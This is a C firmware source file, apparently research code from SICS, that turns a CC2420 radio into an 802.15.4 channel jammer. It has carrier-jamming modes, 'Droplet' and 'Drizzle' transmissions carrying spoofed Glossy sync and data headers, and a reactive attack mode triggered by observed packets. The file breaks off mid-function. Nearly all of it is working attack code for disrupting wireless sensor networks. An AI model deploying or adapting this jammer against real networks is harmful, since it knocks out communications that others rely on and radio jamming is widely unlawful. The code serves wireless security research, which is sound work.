/*
 * Copyright (c) 2014, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is NOT part of the Contiki operating system.
 *
 */

/**
 * \file
 *         Channel jammer program for CC2420
 * \author
 *         Zhitao He <zhitao@sics.se>
 */

#include "cc2420-jammer.h"
#include "commands.h"

#define DEBUG 0
#if DEBUG
#define PRINTF(...) printf(__VA_ARGS__)
#else
#define PRINTF(...)
#endif

#define BUSYWAIT_UNTIL(cond, max_time)                                  \
  do {                                                                  \
    rtimer_clock_t t0;                                                  \
    t0 = RTIMER_NOW();                                                  \
    while(!(cond) && RTIMER_CLOCK_LT(RTIMER_NOW(), t0 + (max_time)));   \
  } while(0)

// 802.15.4 reverse-phased byte, obtained by flipping bit 7 and bit 3.
#define RP_BYTE(byte) \
	do { \
		byte = ((byte) & 0x77) | ((~(byte)) & 0x88); \
	} while(0)

#define CHANNEL 26
#define TXPOWER_LEVEL 3

#define TX_INTERVAL (CLOCK_SECOND / 1)
#define ATTACK_GAP (CLOCK_SECOND * 1)
#define MAX_TX_PACKETS 1
#define PAYLOAD_LEN 20
/* exprimental value used to occupy near full bandwidth, assuming RIMTER_SECOND = 4096 * N */
/* "SFD gap" = 298 us out of 4395 us Droplet interval => actual free air time = 298 - 160 (preamble+SFD) = 138 us => free bandwidth = 138/4395 = 3.1% */
/* #define DEFAULT_RTIMER_INTERVAL (RTIMER_SECOND / 128) */
#define RTIMER_INTERVAL ((RTIMER_SECOND + (225/2)) / 225 )
#define DST_ADDR0 2
#define DST_ADDR1 0
#define MAX_ATTACK_COUNT 1

#define AUTOACK (1 << 4)
#define ADR_DECODE (1 << 11)
#define CCAMUX_BV (31<<0)
#define SFDMUX_BV (31<<5)
#define AUTOCRC (1<<5)
#define FIFOP_THR_MSB 6
#define FIFOP_THR_LSB 0
#define RX_MODE_BV (3<<0)
#define RX_MODE_1 (1<<0)
#define RX_MODE_2 (2<<0)
#define RX_MODE_3 (3<<0)
#define TX_MODE_BV (3<<2)
#define TX_MODE_1 (1<<2) // Tx mode 1: serial mode
#define TX_MODE_2 (2<<2)
#define TX_MODE_3 (3<<2)

void
start_mode(int new_mode);

extern int cc2420_packets_seen, cc2420_packets_read;
extern volatile int jam_ena;
extern const uint8_t jam_data[6];

long int sum_rssi;
long unsigned sum_lqi;
int min_rssi = 15, max_rssi = -55;
unsigned min_lqi = 108, max_lqi = 0;

static int mode;

static clock_time_t tx_interval = TX_INTERVAL;
static clock_time_t attack_gap = ATTACK_GAP;
static unsigned max_tx_packets = MAX_TX_PACKETS;
static unsigned payload_len = PAYLOAD_LEN;
static rtimer_clock_t rtimer_interval = RTIMER_INTERVAL;
static uint8_t len_hdr = 127;
static uint8_t rp_en = 0;
static uint8_t air = 0;
static uint8_t hexin = 0;
static uint8_t tx_source = TX_SOURCE_DROPLETS;
static uint8_t manual_crc = 0;
static uint8_t prepend_phy_hdr = 1;
static uint16_t max_attack_count = MAX_ATTACK_COUNT;

static struct etimer et, et_run;
static struct rtimer rt;
static uint16_t seqno;
static uint16_t attack_count;
static int attack_on;
/* A byte sequence of certain length */
struct hex_seq
{
	const uint8_t *data;
	const size_t size;
};

/* frame buffer for transmission */
static uint8_t frame_buf[128];
static size_t frame_buf_len;
static int frame_buf_byte_id;

/* hex stream buffer from serial input */
static uint8_t *hex_ibuf_ptr;
static size_t hex_ibuf_len;

/* A byte buffer with a size */
struct hex_buf {
	uint8_t *buf;
	size_t bufsize;
};

#define NCHUNKS 4
static struct hex_buf chunks[NCHUNKS];
static int chunk_index;

/* Drizzle mode content */
// No. zero preamble nimbles should be equal or greater than target network's SYNWORD setting in order to trigger RF synchronization.
// beware of possible extra zero nymbles wrap-around btw. the last byte of TXFIFO and the first byte
const static uint8_t sfd_1z[] = {0x06, 0xA7, 127};
const static uint8_t sfd_2z[] = {0x00, 0xA7, 127};
const static uint8_t sfd_3z[] = {0x06, 0x00, 0xA7, 127};
const static uint8_t sfd_1z_packed[] = {0x70, 0xFA, 0x07, 0xA7, 0x7F}; // two sync hdrs, each 2.5 bytes,  squeezed together
const static uint8_t all_zeros[128];
const static uint8_t pellet[128] = {[80]=0x00, 0xA7, 0x04, 0x30, 0x31, 0xA8, 0x96};
const static uint8_t fake_glossy_header[] = {0x00, 0xA7, 127, 0xA3}; // glossy header: preamble + sfd + len byte + glossy app header nimble (0xA) + glossy pkt type nimble (0x1...0x4)
const static uint8_t glossy_sync_pkt_reversed[] = {0x88, 0x2F, 0x83, 0x2C, 0x8B, 0x88, 0xB6, 0xD5, 0x88, 0x89, 0x88, 0x88, 0xEB, 0xA3}; // preamble + SFD + LEN + 0xA4 + host node id (2B) + current time of host (2B) + N of slots in current round + round period + empty slots (2B)
const static uint8_t glossy_sync_pkt_payload[] = {0xA4, 0x21, 0x00, 0x3e, 0x5d, 0x00, 0x02, 0x00, 0x00}; // 0xA4 + host node id (2B) + current time of host (2B) + N of slots in current round + round period + empty slots (2B)
const static uint8_t glossy_data_pkt_payload[] = {0xA3, 0xEE, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00}; // 0xA3 + src addr (2B) + dst addr (2B) + payload size (1B) + no. pkts in queue (1B) + data option (1B) + usr payload ("Hi!")

const static struct hex_seq droplets[] =	{
	{sfd_2z, sizeof(sfd_2z)},
	{pellet, sizeof(pellet)},
	{fake_glossy_header, sizeof(fake_glossy_header)},
	{glossy_sync_pkt_payload, sizeof(glossy_sync_pkt_payload)},
	{glossy_data_pkt_payload, sizeof(glossy_data_pkt_payload)},
	{glossy_sync_pkt_reversed, sizeof(glossy_sync_pkt_reversed)},
};

static int droplet_index;
static uint8_t txfifo_data[128];
static linkaddr_t dst_addr = { {DST_ADDR0, DST_ADDR1} };

static struct variable const variable_list[] = {
	{'l', (union number*)&len_hdr, sizeof(len_hdr), "len_hdr", 0, 127},
	{'t', (union number*)&tx_interval, sizeof(tx_interval), "tx_interval", 0, (unsigned)~0},
	{'r', (union number*)&rtimer_interval, sizeof(rtimer_interval), "rtimer_interval", 0, (unsigned)~0},
	{'y', (union number*)&payload_len, sizeof(payload_len), "payload_len", 0, 127},
	{'p', (union number*)&max_tx_packets, sizeof(max_tx_packets), "max_tx_packets", 0, (unsigned)~0},
	{'h', (union number*)&droplet_index, sizeof(droplet_index), "droplet_index", 0, sizeof(droplets)/sizeof(struct hex_seq)-1},
	{'d', (union number*)&dst_addr.u8[0], sizeof(dst_addr.u8[0]), "dst_addr.u8[0]", 0, 3},
	{'D', (union number*)&dst_addr.u8[1], sizeof(dst_addr.u8[1]), "dst_addr.u8[1]", 0, 3},
	{'m', (union number*)&rp_en, sizeof(rp_en), "reverse phase enabled", 0, 1},
	{'a', (union number*)&air, sizeof(air), "serial air", 0, 1},
	{'H', (union number*)&hexin, sizeof(hexin), "serial hexin", 0, 1},
	{'c', (union number*)&chunk_index, sizeof(chunk_index), "chunk_index", 0, NCHUNKS -1},
	{'C', (union number*)&manual_crc, sizeof(manual_crc), "manual_crc", 0, 1},
	{'x', (union number*)&tx_source, sizeof(tx_source), "tx_source", 0, MAX_TX_SOURCE - 1},
	{'P', (union number*)&prepend_phy_hdr, sizeof(prepend_phy_hdr), "prepend_phy_hdr", 0, 1},
	{'B', (union number*)&frame_buf_byte_id, sizeof(frame_buf_byte_id), "frame_buf_byte_id", 0, sizeof(frame_buf) - 1},
	{'G', (union number*)&attack_gap, sizeof(attack_gap), "attack_gap", 0, (unsigned)~0},
	{'A', (union number*)&max_attack_count, sizeof(max_attack_count), "max_attack_count", 0, (uint16_t)~0},
};

const static struct field field_list[] = {
	{'c', "CCAMUX", CC2420_IOCFG1, 4, 0},
	{'s', "SFDMUX", CC2420_IOCFG1, 9, 5},
	/* the TX DACs data source is selected by DAC_SRC according to: */
	/* 0: Normal operation (from modulator). */
	/* 1: The DAC_I_O and DAC_Q_O override values below.- */
	/* 2: From ADC, most significant bits */
	/* 3: I/Q after digital down mixing and channel filtering. */
	/* 4: Full-spectrum White Noise (from CRC) */
	/* 5: From ADC, least significant bits */
	/* 6: RSSI / Cordic Magnitude Output */
	/* 7: HSSD module. */
	{'d', "DAC_SRC", CC2420_DACTST, 14, 12},
	/* DAC override values, 5-bit */
	{'i', "DAC_I_O", CC2420_DACTST, 11, 5},
	{'q', "DAC_I_Q", CC2420_DACTST, 4, 0},
	/* LNA and mixer gain: 0=automatic, 1,2,3=low,mid,high */
	{'g', "LNAMIX_GAINMODE_O", CC2420_AGCCTRL, 3, 2},
	/* VGA gain override: 0=automatic, 1=manual  */
	{'V', "VGA_GAIN_OE", CC2420_AGCCTRL, 11, 11},
	/* VGA gain: 0-127, non-linear, non-monotonic relationship btw. value and gain  */
	/* read <= current gain, write => manual gain */
	{'v', "VGA_GAIN", CC2420_AGCCTRL, 10, 4},
	/* Modulation mode: 0=normal, 1=reverse phase */
	{'P', "MOD_MODE", CC2420_MDMCTRL1, 4, 4},
	/* Preamble length in bytes: 0-15=1-16 */
	{'E', "PREAMBLE_LENGTH", CC2420_MDMCTRL0, 3, 0},
	/* Carrier frequency in 1 MHz steps: 0-1023=2048-3071 MHz, 357=2405 MHz */
	{'f', "FREQ", CC2420_FSCTRL, 9, 0},
	/* Output PA level: 3=-25dB, 7=-15dB, 11=-10dB 15=-7dB 19=-5dB 23=-3dB 27=-1dB 31=0dB */
	{'p', "PA_LEVEL", CC2420_TXCTRL, 4, 0},
	/* 16-bit Syncword: 0xA70F="00" preamble, 0xA7FF="0" preamble, 0xA700="000" preamble */
	{'S', "SYNCWORD", CC2420_SYNCWORD, 15, 0},
	/* The time after the last chip in the packet is sent, and the TXRX switch is disabled. In μs. */
	{'t', "TC_TXEND2SWITCH[2:0]", CC2420_FSMTC, 5, 3},
	/* The time after the last chip in the packet is sent, and the PA is set in power-down. Also the time at which the modulator is disabled. In μs. */
	{'T', "TC_TXEND2PAOFF[2:0]", CC2420_FSMTC, 2, 0},
	{'A', "ATESTMOD_PD", CC2420_TOPTST, 4, 4},
	/* ATEST mode: 0-7, we skip mode 8 */
	{'a', "ATESTMOD_MODE[2:0]", CC2420_TOPTST, 2, 0},
	{'K', "ADR_DECODE", CC2420_MDMCTRL0, 11, 11},
	{'k', "AUTOACK", CC2420_MDMCTRL0, 4, 4},
	{'B', "BATTMON_EN", CC2420_BATTMON, 5, 5},
	// Vtoggle=1.25/27*(72-BATTMON_VOLTAGE) (BATTMON_VOLTAGE=[0, 31] => Vtoggle=[1.90, 3.33])
	{'b', "BATTMON_VOLTAGE", CC2420_BATTMON, 4, 0},
	{'O', "BATTMON_OK", CC2420_BATTMON, 6, 6}, // read-only
	{'F', "FIFO_THR", CC2420_IOCFG0, 6, 0},
	{'I', "ADC_I", CC2420_ADCTST, 14, 8},
	{'Q', "ADC_Q", CC2420_ADCTST, 6, 0},
	{'e', "RESETn", CC2420_MAIN, 15, 15}, // wrtie '0' to reset radio
	{'u', "TX_TURNAROUND", CC2420_TXCTRL, 13, 13}, 
	//Number of consecutive reference clock periods with successful synchronisation windows required to indicate lock: 64, 128, 256, 512
	{'o', "LOCK_THR[1:0]", CC2420_FSCTRL, 15, 14}, 
};

PROCESS(test_process, "CC2420 jammer");
AUTOSTART_PROCESSES(&test_process);

static void packet_input(void);

/*-----------------------------------------------------------------------------*/
static int
char_hex(char c)
{
	if (c >= '0' && c <= '9') {
		return c - '0';
	} else if (c >= 'A' && c <= 'F') {
		return c - 'A' + 10;
	} else if (c >= 'a' && c <= 'f') {
		return c - 'a' + 10;
	}
	return -1;
}

/* convert a string of HEX chars into a byte array */
static size_t
fill_hex_buf(char *str, int n, uint8_t *buf, size_t bufsize)
{
	int i;
	uint8_t *p = buf;
	int h, l;

	// throw away trailing odd char
	n = (n >> 1) << 1;
	// truncate long string to avoid buffer overflow
	if (n > bufsize * 2) {
		n = bufsize * 2;
	}

	// read two hex numbers as one byte at a time, msb first
	for (i = 0; i < n; i+=2, p++) {
		if ((h = char_hex(str[i])) >= 0 && (l = char_hex(str[i+1])) >= 0) {
			*p = (h<<4) + l;
		} else {
			return -2;
		}
	}

	return p - buf;
}
/*-----------------------------------------------------------------------------*/
static void
reverse_phase(uint8_t *buf, size_t buflen)
{
	int i;
	PRINTF("0x");
	for(i = 0; i < buflen; i++) {
		RP_BYTE(buf[i]);
		PRINTF("%2X", buf[i]);
	}
	PRINTF("\n");
}
/*---------------------------------------------------------------------------*/
unsigned
getreg(unsigned regname)
{
  unsigned reg;
  CC2420_READ_REG(regname, reg);
  return reg;
}
/*---------------------------------------------------------------------------*/
void
setreg(unsigned regname, unsigned value)
{
  CC2420_WRITE_REG(regname, value);
}

/*---------------------------------------------------------------------------*/
static void
pad(uint8_t* dst, size_t dst_len, const uint8_t* src, const size_t src_len, void (*update_src)(uint8_t *src))
{
	int i;
	uint8_t tmp[src_len];

	memcpy(tmp, src, src_len);
	for(i = 0;i < dst_len - dst_len % src_len;i+=src_len) {
		memcpy(dst+i, tmp, src_len);
		if(update_src) {
			update_src(tmp);
		}
	}
	memcpy(dst+i, src, dst_len % src_len);
}

/*---------------------------------------------------------------------------*/
/* Print HEX buffer content */
static void
print_hex_buf(const char *prefix, const uint8_t *buf, size_t bufsize)
{
	int i;
	char dbuf[bufsize*2+1];
	char *dbuf_ptr = dbuf;
	if (buf && bufsize) {
		for(i = 0;i < bufsize;++i){
			dbuf_ptr += snprintf(dbuf_ptr, sizeof(dbuf), "%02x", buf[i]);
		}
		printf("%s%s\n", prefix, dbuf);
	}
}

/*---------------------------------------------------------------------------*/
/* Periodic Droplet transmission */
static void
send_len_buf(struct rtimer *t, void *ptr)
{
	if (ptr) {
		/* Write empty frame to TX FIFO. */
		// frame length is appended by a bogus byte that induces a minimal delay to the power-down of the TX circuit, thus avoiding corruption of transmitted frame length.
		CC2420_WRITE_FIFO_BUF(&len_hdr, 2);

		/* CC2420_WRITE_FIFO_BUF(&(droplets[droplet_index].data), droplets[droplet_index].size +1); */

		/* Transmit */
		strobe(CC2420_STXON);

		/* We wait until underflow has occured, which should take at least
		   tx touraround time (128 us) + 4 preamble bytes + SFD byte (5*32=160 us) = 288 us */
		BUSYWAIT_UNTIL((status() & BV(CC2420_TX_UNDERFLOW)), RTIMER_SECOND / 2000);

		/* Flush TX FIFO */
		strobe(CC2420_SFLUSHTX);

		/* schedule next send */
		rtimer_set(&rt, rt.time + rtimer_interval, 0, send_len_buf, (void *)1);
	}
}

/*---------------------------------------------------------------------------*/
/* Reset transmitter to normal packet mode */
static void
reset_transmitter(void)
{
  unsigned reg;

  /* set normal TX mode 0, normal RX mode 0 */
  reg = getreg(CC2420_MDMCTRL1);
	reg &= ~(TX_MODE_BV | RX_MODE_BV);
  setreg(CC2420_MDMCTRL1, reg);
	/* printf("0x%04x\n", reg); */

  /* set TX DAC's data source to modulator (normal operation) */
  reg = getreg(CC2420_DACTST);
  setreg(CC2420_DACTST, reg & 0x0FFF);

	/* enable AUTOCRC */
	reg = getreg(CC2420_MDMCTRL0);
	reg |= AUTOCRC;
	setreg(CC2420_MDMCTRL0, reg);

	/* reset FIFOP threshold to maximum */
	reg = getreg(CC2420_IOCFG0);
	setreg(CC2420_IOCFG0, SETFV(reg, 127, FIFOP_THR_MSB, FIFOP_THR_LSB));

	/* Turn off autoack */
	reg = getreg(CC2420_MDMCTRL0);
	reg &= ~(AUTOACK | ADR_DECODE);
	setreg(CC2420_MDMCTRL0, reg);

	/* Clear FIFOs */
	strobe(CC2420_SFLUSHTX);
	strobe(CC2420_SFLUSHRX);

  /* enter RX mode */
  /* strobe(CC2420_SRXON); */
	/* strobe(CC2420_SRFOFF); */
	cc2420_on();
}
/*---------------------------------------------------------------------------*/
/* Transmit a continuous carrier */
void
send_carrier(int mode)
{
  unsigned reg = getreg(CC2420_MDMCTRL1);
  if(mode == UNMOD) {
		/* unmodulated carrier */
		reg &= ~TX_MODE_BV;
		reg |= TX_MODE_3;
    setreg(CC2420_MDMCTRL1, reg);
    setreg(CC2420_DACTST, 0x1800);
  } else if(mode == MOD) {
		/* randomly modulated carrier */
		reg &= ~TX_MODE_BV;
		reg |= TX_MODE_3;
    setreg(CC2420_MDMCTRL1, reg);
  } else if(mode == DRIZZLE) {
		reg &= ~TX_MODE_BV;
		reg |= TX_MODE_2;
    setreg(CC2420_MDMCTRL1, reg);
	}
	strobe(CC2420_STXON);
}
/*---------------------------------------------------------------------------*/
static void
inc_first_byte(uint8_t *src)
{
	(*(src+1))++;
}
/*---------------------------------------------------------------------------*/
static void
stop_rtimer(void)
{
	rt.ptr = NULL; 		// stop rtimer
}

/*---------------------------------------------------------------------------*/
static void
rx_mode(int new_mode)
{
	rimestats.llrx = 0;
	rimestats.badcrc = 0; 
	rimestats.badsynch = 0; 
	rimestats.toolong = 0;
	sum_lqi = 0;
	sum_rssi = 0;

	CC2420_CLEAR_FIFOP_INT();
	CC2420_ENABLE_FIFOP_INT();
	flushrx();
	/* strobe(CC2420_SRXON); */
	cc2420_on();
}

static void
off_mode(int new_mode)
{
	/* strobe(CC2420_SRFOFF); */
	cc2420_off();
}

static void
cs_mode(int new_mode)
{
	flushrx();
	// enter reverse modulation mode to avoid packet decoding
	do_command("P+");
	strobe(CC2420_SRXON);
	etimer_set(&et, CLOCK_SECOND / 1);
}

static void
cs_prolog(void)
{
	// revert modulation mode
	do_command("P-");
}

static void
unmod_mode(int new_mode)
{
	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
	send_carrier(new_mode);
}

static void
mod_mode(int new_mode)
{
	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
	send_carrier(new_mode);
}

static void tx_eth(void);

static void
tx_mode(int new_mode)
{
	unsigned reg;
	seqno = 0;
	/* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt */
	/* Turn off automatic packet acknowledgment and address decoding. */
	reg = getreg(CC2420_MDMCTRL0);
	reg &= ~(AUTOACK | ADR_DECODE);
	setreg(CC2420_MDMCTRL0, reg);
	/* strobe(CC2420_SRXON); */
	cc2420_on();
	/* etimer_set(&et, tx_interval); */
	tx_eth();
}

static void
tx2_mode(int new_mode)
{
	unsigned reg;
	seqno = 0;
	/* Turn on automatic packet acknowledgment and address decoding. */
	reg = getreg(CC2420_MDMCTRL0);
	reg |= AUTOACK | ADR_DECODE;
	setreg(CC2420_MDMCTRL0, reg);
	strobe(CC2420_SRXON);

	etimer_set(&et, tx_interval);
}

static void
droplet_mode(int new_mode)
{
	CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt
	// Test: CCA interrupt might cause extra delay
	CC2420_DISABLE_CCA_INT();
	CC2420_CLEAR_CCA_INT();

	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND / 2);
	/* Start sending Droplets */
	// add a small jitter (+/-122 us, assuming RTIMER_SECOND = 32768) around the average interval to randomize phase
	rtimer_set(&rt, RTIMER_NOW() + rtimer_interval - 4 + (random_rand()%9) , 0, send_len_buf, (void *)1);
}

// Periodic TXFIFO update (used during Drizzle transmission)
/* static void */
/* update_txfifo(struct rtimer *t, void *ptr) */
/* { */
/* 	// packet consists of a sequence number */
/* #define HLEN 5 // header len : preamble+sync+payload_len */
/* #define PLEN 2 // payload len */
/* #define CLEN 2 // checksum len */
/* 	static uint8_t snippet[HLEN+PLEN+CLEN] = {0x00, 0x00, 0x00, 0xCD, PLEN+CLEN}; */
/* 	unsigned short checksum; */
/* 	static uint16_t seqno; */

/* 	seqno = ptr ? 0 : seqno+1; */
/* 	snippet[HLEN] = (uint8_t)(seqno & 0xFF); */
/* 	snippet[HLEN+1] = (uint8_t)(seqno >> 8); */

/* 	checksum = crc16_data(&snippet[HLEN], PLEN, 0); */
/* 	snippet[PLEN+HLEN] = (uint8_t)(checksum & 0xFF); */
/* 	snippet[PLEN+HLEN+1] = (uint8_t)(checksum >> 8); */

/* 	CC2420_WRITE_RAM(&snippet, CC2420RAM_TXFIFO, HLEN+PLEN+CLEN); */

/* 	rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND*4096L/1000000L+1, 0, update_txfifo, (void *)0); */
/* } */

static void
drizzle_mode(int new_mode)
{
	/* // TEST: send Drizzle with wrong synch header, in order to create attack solely by including sending Droplet headers in the payload */
	/* setreg(CC2420_SYNCWORD, 0xCD0F); */
	/* printf("SYNCWORD=0x%02x\n", getreg(CC2420_SYNCWORD)); */
	
	uint8_t buf[128];
	size_t buflen;
	uint8_t *pbuf = buf;

	if (!attack_count) {
		attack_count++;
		attack_on = 1;
		printf("attack begins\n");
	} else {
		attack_count++;
		goto start_attack;
	}

	/* Optional: reserve 3 bytes for 802.15.4 Preamble, SFD and LEN */
	if (prepend_phy_hdr) {
		pbuf += 3;
	}

	if (tx_source == TX_SOURCE_SEQNO) {
		/* Send a seqno appended by random bytes*/
		int i;
		buflen = payload_len;
		for(i = 0;i < payload_len;++i) {
			buf[i] = (uint8_t)random_rand();
		}
		snprintf((char *)pbuf, sizeof(buf), "%u", seqno);
	} else if (tx_source == TX_SOURCE_DROPLETS) {
		/* Test: send droplet packet, assumed packet format: preamble+SFD+LEN+Payload+CRC*/
		// Debug print
		print_hex_buf("Drizzle payload: ", droplets[droplet_index].data, droplets[droplet_index].size);

		buflen = droplets[droplet_index].size;
		memcpy(pbuf, droplets[droplet_index].data, buflen);
	} else if (tx_source == TX_SOURCE_FRAME_BUF) {
		/* send frame buf */
		memcpy(pbuf, frame_buf, frame_buf_len);
		buflen = frame_buf_len;
	} else {
		/* unkown source */
		return;
	}
	/* Optional: reverse phase of payload */
	if (rp_en) {
		reverse_phase(pbuf, buflen);
		print_hex_buf("RP buf: ", buf, buflen);
	}
	/* Optional: append payload with manual CRC, instead of no CRC */
	if (manual_crc) {
		uint16_t checksum = crc16_data(pbuf, buflen, 0);
		/* printf("checksum = %4x\n", checksum); */
		pbuf[buflen] = checksum & 0xFF;
		pbuf[buflen+1] = checksum >> 8;
		print_hex_buf("tx packet (with CRC): ", pbuf, buflen+2);
		buflen += 2;
	}

	if (prepend_phy_hdr) {
		buf[0] = 0x00; // preamble
		buf[1] = 0xA7; // SFD
		buf[2] = buflen; // LEN = payload + crc
		buflen += 3;
	}

	/* Fill Tx FIFO with replicates of content in buf */
	pad(txfifo_data, sizeof(txfifo_data), buf, buflen, NULL);

	// Debug print
	print_hex_buf("TXFIFO: ", txfifo_data, sizeof(txfifo_data));

	CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
 start_attack:
	/* etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND); */
	etimer_set(&et, max_tx_packets * tx_interval);
	send_carrier(new_mode);
	ADC1_PORT(OUT) |= BV(ADC1_PIN); // flock lab io tracing signal INT1
	leds_on(LEDS_RED);
	// TEST: automatically update Drizzle content continuously during transmssion
	/* if (!seq.data[0] && !seq.data[1] && !seq.data[2]) { */
	/* 	rtimer_set(&rt, RTIMER_NOW() + RTIMER_SECOND/256, 0, update_txfifo, (void *)1); */
	/* } */
}

/* Reactive jamming */
/* static void */
/* jam_mode(int new_mode) */
/* { */
/* 	unsigned reg; */
/* 	jam_ena = 0; */
/* 	CC2420_DISABLE_CCA_INT(); */
/* 	CC2420_CLEAR_CCA_INT(); */
/* 	// clear any jam data in TX */
/* 	strobe(CC2420_SFLUSHTX); */
/* 	/\* // clear buffer *\/ */
/* 	/\* packetbuf_clear(); *\/ */
/* 	/\* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 "packet data received" interrupt *\/ */
/* 	/\* CC2420_CLEAR_FIFOP_INT(); *\/ */
/* 	flushrx(); */
/* #if ENABLE_CCA_INTERRUPT */
/* 	/\* CC2420_CLEAR_CCA_INT(); *\/ */
/* 	/\* CC2420_ENABLE_CCA_INT(); // enable cc2420 "packet header detected" interrupt *\/ */
/* #endif */
/* 	jam_ena = 1; */

/* 	/\* TEST: turn off AUTOCRC in order to send frame headers as normal packets *\/ */
/* 	reg = getreg(CC2420_MDMCTRL0); */
/* 	reg &= ~AUTOCRC; */
/* 	setreg(CC2420_MDMCTRL0, reg); */

/* 	/\* Raise FIFOP interrupt immediately after the length byte, i.e. the 1st byte into RXFIFO, is received *\/ */
/* 	reg = getreg(CC2420_IOCFG0); */
/* 	setreg(CC2420_IOCFG0, SETFV(reg, 1, FIFOP_THR_MSB, FIFOP_THR_LSB)); */

/* 	/\* Pre-fill TX FIFO for next jam *\/ */
/* 	CC2420_WRITE_FIFO_BUF(&jam_data, sizeof(jam_data)); */

/* 	strobe(CC2420_SRXON); */

/* 	PRINTF("CCA interrupt enabled = %s\n", CC2420_CCA_PORT(IE) & BV(CC2420_CCA_PIN) ? "true":"false"); */
/* 	PRINTF("CCA inerrtupt on falling edge = %s\n", CC2420_CCA_PORT(IES) & BV(CC2420_CCA_PIN) ? "true":"false"); */
/* } */

/* Reactive attack mode */
static void
ack_mode(int new_mode)
{
	unsigned reg;
	CC2420_CLEAR_FIFOP_INT();
	CC2420_ENABLE_FIFOP_INT();
	flushrx();
	/* Turn off automatic packet acknowledgment and address decoding. */
	reg = getreg(CC2420_MDMCTRL0);
	reg &= ~(AUTOACK | ADR_DECODE);
	setreg(CC2420_MDMCTRL0, reg);
	/* strobe(CC2420_SRXON); */
	cc2420_on();
}

/* ack decision function */
static int
ack_should_begin(uint8_t *frame, uint8_t len)
{
	/* look for glossy app header */
	if (frame[0] == 0xA3 && len >= 10) {
		uint16_t count = frame[8] + frame[9]*256;
		if (count >= 10 && count <=14) {
			printf("ack begin: count %u\n", count);
			return 1;
		}
	}
	return 0;
}

/* ack decision function */
static int
ack_should_end(uint8_t *frame, uint8_t len)
{
	/* look for glossy app header */
	if (frame[0] == 0xA3 && len >= 10) {
		uint16_t count = frame[8] + frame[9]*256;
		if (count >= 90 && count <=99) {
			printf("ack end: count %u\n", count);
			return 1;
		}
	}
	return 0;
}

/* ack mode packet handler */
static void
ack_handler(uint8_t *frame, uint8_t len)
{
	/* printf("ACK pkt size = %u\n", len); */
	static int ack_begun;
	seqno = 0;
	if (!ack_begun) {
		if (ack_should_begin(frame, len)) {
			ack_begun = 1;
			tx_eth();
		}
	} else {
		if (ack_should_end(frame, len)) {
			ack_begun = 0;
		}
	}
}

static void
ack_eth(void)
{
	tx_eth();
}

static void
tx_eth(void)
{
	int errno;
	uint8_t buf[128];
	size_t buflen;

	if(seqno < max_tx_packets) {
		PROCESS_CONTEXT_BEGIN(&test_process);
		etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);
		PROCESS_CONTEXT_END(&test_process);

		if (tx_source == TX_SOURCE_SEQNO) {
		/* Send a seqno appended by random bytes*/
			int i;
			buflen = payload_len;
			for(i = 0;i < payload_len;++i) {
				buf[i] = (uint8_t)random_rand();
			}
			snprintf((char *)buf, sizeof(buf), "%u", seqno);
		} else if (tx_source == TX_SOURCE_DROPLETS) {
			/* Test: send droplet packet, assumed packet format: preamble+SFD+LEN+Payload+CRC*/
			// Debug print
			print_hex_buf("Droplet -> ", droplets[droplet_index].data, droplets[droplet_index].size);

			buflen = droplets[droplet_index].size;
			memcpy(buf, droplets[droplet_index].data, buflen);
		} else if (tx_source == TX_SOURCE_FRAME_BUF) {
			/* send frame buf */
			memcpy(buf, frame_buf, frame_buf_len);
			buflen = frame_buf_len;
		} else {
			/* unkown source */
			return;
		}
		/* Optional: reverse phase of droplet */
		if (rp_en) {
			reverse_phase(buf, buflen);
			print_hex_buf("RP buf: ", buf, buflen);
		}
		/* Optional: append payload with manual CRC instead of auto CRC */
 		if (manual_crc) {
			uint16_t checksum = crc16_data(buf, buflen, 0);
			/* printf("checksum = %4x\n", checksum); */
			buf[buflen] = checksum & 0xFF;
			buf[buflen+1] = checksum >> 8;
			print_hex_buf("tx packet (with CRC): ", buf, buflen+2);
			uint16_t reg = getreg(CC2420_MDMCTRL0);
			reg &= ~AUTOCRC;
			setreg(CC2420_MDMCTRL0, reg);
		}

		/* Send packet */
		// assuming cc2420_send() computes LEN with LEN = payload_len + 2
		errno = cc2420_driver.send(buf, buflen);
		if (errno == RADIO_TX_OK) printf(". ");
		else printf("cc2420_send error: %d\n", errno);

		/* Increment seqno */
		++seqno;
	} else {
		/* Stop etimer and reset packet counter */
		PROCESS_CONTEXT_BEGIN(&test_process);
		etimer_stop(&et);
		PROCESS_CONTEXT_END(&test_process);
